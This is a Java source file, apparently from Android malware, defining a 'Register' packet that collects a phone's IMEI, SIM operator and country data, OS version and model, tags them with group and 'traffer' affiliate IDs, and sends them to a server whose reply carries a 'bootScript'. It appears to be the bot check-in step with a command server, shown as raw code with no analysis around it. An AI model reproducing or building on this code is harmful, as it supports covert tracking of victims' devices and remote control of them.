package com.address.core.packets;

import com.address.core.Consts;
import com.address.core.RunService;
import com.address.core.net.AnswerPacket;
import com.address.core.net.Packet;
import com.address.core.utilities.DeviceName;
import com.address.core.xAPI;

public class Register extends Packet {
    public int group_id = 0;
    public String imei = null;
    public String note = "";
    public String os = null;
    public String os_version = null;
    public String phone_model = "blabla";
    public int reffer_id = 0;
    public String sim_country = null;
    public String sim_current_country = null;
    public String sim_current_operator = null;
    public String sim_operator = null;
    public String version = Consts.version;

    public class Answer extends AnswerPacket {
        public String bootScript = "";
        public String uniqID = "";
    }

    public Register() {
        init("register");
        xAPI api = RunService.getService().getAPI();
        this.imei = api.getTelephonyInfo()[0];
        this.os = "android";
        this.os_version = api.getAndroidVersion();
        this.sim_country = api.getTelephonyInfo()[5];
        this.sim_operator = api.getTelephonyInfo()[4];
        this.sim_current_country = api.getTelephonyInfo()[3];
        this.sim_current_operator = api.getTelephonyInfo()[2];
        this.group_id = Consts.groupName;
        this.reffer_id = Consts.trafferName;
        this.phone_model = DeviceName.getDeviceName();
    }
}
